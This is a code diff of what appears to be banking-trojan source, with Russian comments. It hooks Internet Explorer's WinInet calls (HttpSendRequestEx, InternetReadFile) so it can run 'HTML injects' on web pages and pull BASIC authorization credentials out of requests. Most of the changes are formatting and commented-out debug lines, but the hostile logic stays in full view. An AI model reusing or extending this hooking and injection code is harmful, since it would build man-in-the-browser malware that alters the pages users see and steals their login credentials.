@@ -202,20 +202,16 @@ bool DoInjectIE(PRequest Request)
     	return false;
 
 	// Обрабатываем загруженные данные
-	IEDBG(Request, Request->Buffer, "--->> Выполняем HTML инжекты");
+	//IEDBG(Request, Request->Buffer, "--->> Выполняем HTML инжекты");
 
 	THTTPSessionInfo Session;
 
 	Session.BrowserType = BROWSER_TYPE_IE;
-	Session.UserAgent = IEUserAgent;
-	Session.URL = Request->URL;
+	Session.UserAgent   = IEUserAgent;
+	Session.URL         = Request->URL;
 
 	bool Res = HTMLInjects::Execute(Request, &Session);
 
-	if (Res)
-	{
-		IEDBG(Request, Request->Buffer, "--->> Инжекты успешно выполнены");
-	}
 
 	return Res;
 }
@@ -242,14 +238,15 @@ PCHAR GetInetOption(HINTERNET Handle, DWORD Option)
 }
 // ---------------------------------------------------------------------------
 
-PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option) {
+PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option)
+{
 	// Получить значение для интернет сессии
 	if (Handle == NULL)
 		return NULL;
 	PCHAR Result = NULL;
 	DWORD Size = 0;
-
-	if (!pHttpQueryInfoA(Handle, Option, NULL, &Size, NULL) && Size != 0) {
+	if (!pHttpQueryInfoA(Handle, Option, NULL, &Size, NULL) && Size != 0)
+	{
 		Result = STR::Alloc(Size);
 		pHttpQueryInfoA(Handle, Option, (LPVOID)Result, &Size, NULL);
 		if (STR::IsEmpty(Result))
@@ -521,12 +518,14 @@ BOOL WINAPI HttpSendRequestExHandler(BOOL bType, HINTERNET hRequest,
 	#endif
 
 	if (lpBuffersIn->dwHeadersLength && lpBuffersIn->lpcszHeader) {
-		if (bType) {
+		if (bType)
+		{
 			pHttpAddRequestHeadersA((HINTERNET)hRequest, (LPCTSTR)
 				lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength,
 				HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 		}
-		else {
+		else
+		{
 			pHttpAddRequestHeadersW((HINTERNET)hRequest, (LPCWSTR)
 				lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength,
 				HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
@@ -541,7 +540,7 @@ BOOL WINAPI HttpSendRequestExHandler(BOOL bType, HINTERNET hRequest,
 			(hRequest, lpBuffersIn, lpBuffersOut, dwFlags, dwContext);
 	else
 		return(BOOL)REAL_HttpSendRequestExW(hRequest, (LPINTERNET_BUFFERSW)
-		lpBuffersIn, (LPINTERNET_BUFFERSW)lpBuffersOut, dwFlags, dwContext);
+			lpBuffersIn, (LPINTERNET_BUFFERSW)lpBuffersOut, dwFlags, dwContext);
 }
 // -----------------------------------------------------------------------------
 
@@ -553,13 +552,13 @@ void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
 	DWORD s = sizeof(INTERNET_STATUS_CALLBACK);
 
 	if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_CALLBACK, &isc, &s)
-		&& isc) {
+		&& isc)
+	{
 		DWORD_PTR t;
 
 		s = sizeof(DWORD_PTR);
 
-		if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_CONTEXT_VALUE, &t,
-				&s))
+		if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_CONTEXT_VALUE, &t, &s))
 			dwContext = t;
 
 		isc(hInternet, dwContext, dwInternetStatus, lpvStatusInformation,
@@ -576,7 +575,8 @@ void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
 }
 // -----------------------------------------------------------------------------
 
-void CheckBASICAuthorization(PRequest Request) {
+void CheckBASICAuthorization(PRequest Request)
+{
 	// Метод проверяет наличие в запросе информации о BASIC авторизации
 
 	// Получаем имя пользователя
@@ -602,7 +602,8 @@ void CheckBASICAuthorization(PRequest Request) {
 
 void CallPreviosStatusCallback(INTERNET_STATUS_CALLBACK CallBack,
 	HINTERNET Internet, DWORD_PTR Content, DWORD dwInternetStatus,
-	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
+	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
+{
 	// Вызываем сохранённый метод оьратной связи
 	if (CallBack != NULL)
 		CallBack(Internet, Content, dwInternetStatus, lpvStatusInformation,
@@ -612,7 +613,8 @@ void CallPreviosStatusCallback(INTERNET_STATUS_CALLBACK CallBack,
 
 void CALLBACK InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext,
 	DWORD dwInternetStatus, LPVOID lpvStatusInformation,
-	DWORD dwStatusInformationLength) {
+	DWORD dwStatusInformationLength)
+{
 	// Обрабатываем уведомление обратной связи об изменении статуса интернета
 
 	PRequest Request = (PRequest)dwContext;
@@ -909,10 +911,11 @@ BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
 
 	PRequest pRequest = Request::Find(Requests, hFile);
 
-	if (pRequest != NULL)
+	if (pRequest)
 	{
 		// При первой попытке чтения проверяем дополнительные данные
-		if (!pRequest->FirstHandled) {
+		if (!pRequest->FirstHandled)
+		{
 			pRequest->FirstHandled = true;
 
 			// DbgMsg("InternetExplorer", 0, "Адрес(%d) %s", (DWORD)pRequest->IsInject, pRequest->URL);
@@ -929,12 +932,14 @@ BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
 			// На время исполнения методом заблокируем попытку удаления запроса
 			pResetEvent(pRequest->AllowClose);
 
-			if (bType == 0) {
+			if (bType == 0)
+			{
 				// Перекрытие метода WinInet InternetReadFile
 				r = InjectReadFile(pRequest, lpBuffer, dwNumberOfBytesToRead,
 					lpdwNumberOfBytesRead, dwContext);
 			}
-			else if (bType == 1 || bType == 2) {
+			else if (bType == 1 || bType == 2)
+			{
 				// Перекрытие метода WinInet InternetReadFileExA, InternetReadFileExA
 				LPINTERNET_BUFFERSA pib = (LPINTERNET_BUFFERSA)lpBuffer;
 				r = InjectReadFile
